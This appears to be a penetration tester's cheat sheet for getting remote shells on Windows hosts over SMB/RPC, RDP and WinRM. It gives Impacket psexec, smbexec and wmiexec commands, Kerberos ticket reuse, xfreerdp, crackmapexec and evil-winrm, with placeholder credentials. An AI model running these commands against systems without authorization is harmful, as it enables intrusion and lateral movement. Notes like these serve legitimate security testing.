# Shell
## SMB & RPC: 445, 135
```bash
impacket-psexec '<DOMAIN>/<USER>:<PASS>@<IP>'
impacket-smbexec '<DOMAIN>/<USER>:<PASS>@<IP>'
impacket-wmiexec '<DOMAIN>/<USER>:<PASS>@<IP>'
KRB5CCNAME='<CCACHE>' impacket-smbexec -k -no-pass '<DOMAIN>/<USER>@<TARGET>'
psexec.py '<DOMAIN>/<USER>:<PASS>@<IP>' '<COMMANDS>'
```

## RDP: 3389
```bash
impacket-rdp_check '<DOMAIN>/<USER>:<PASS>@<IP>' # check

xfreerdp /v:<IP> /u:'DOMAIN\<USER>' /p:'<PASS>' /cert:ignore /dynamic-resolution /drive:share,/tmp +clipboard

remmina
```

## WinRM: 5985, 5986
```bash
crackmapexec winrm <IP> -u '<USER>' -p '<PASS>' # check

evil-winrm -i <IP> -u '<USER>' -p '<PASS>'
```

## VNC
